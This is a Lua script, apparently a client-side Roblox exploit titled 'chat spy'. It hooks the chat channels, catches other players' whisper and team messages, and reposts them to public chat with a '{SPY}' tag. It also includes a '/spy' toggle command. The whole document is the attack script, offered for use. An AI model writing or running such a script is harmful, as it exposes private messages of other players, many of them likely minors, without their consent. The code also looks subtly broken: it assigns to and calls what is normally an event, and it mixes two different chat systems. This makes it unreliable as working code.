-- ROBLOX CHAT SPY (FORCEFUL METHOD)
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Configuration
local Config = {
    enabled = true,
    spyOnMyself = true,
    public = true,
    publicItalics = true
}

-- 1. CHAT CHANNEL HIJACKING
local function hijackChatChannel(channelName)
    local channel = TextChatService.TextChannels:WaitForChild(channelName)
    local originalEvent = channel.OnMessageReceived
    
    channel.OnMessageReceived = function(message)
        -- 2. INTERCEPT PRIVATE MESSAGES
        if Config.enabled then
            local textSource = message.TextSource
            if textSource and (Config.spyOnMyself or textSource.UserId ~= player.UserId) then
                local isPrivate = channelName == "RBXWhisper" or channelName == "RBXTeam"
                
                if isPrivate then
                    -- 3. REBROADCAST TO PUBLIC CHAT
                    local formatted = Config.publicItalics and "/me " or ""
                    formatted = formatted .. "{SPY} [".. textSource.Name .."]: ".. message.Text
                    
                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        formatted, 
                        "All"
                    )
                end
            end
        end
        return originalEvent(message)
    end
end

-- 4. HIJACK ALL CHANNELS
hijackChatChannel("RBXGeneral")
hijackChatChannel("RBXSystem")
hijackChatChannel("RBXWhisper")
hijackChatChannel("RBXTeam")

-- 5. COMMAND HANDLER
player.Chatted:Connect(function(message)
    if string.lower(message) == "/spy" then
        Config.enabled = not Config.enabled
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
            "{SPY} "..(Config.enabled and "ENABLED" or "DISABLED"), 
            "All"
        )
    end
end)

-- 6. INITIALIZATION
ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{SPY} ENABLED", "All")
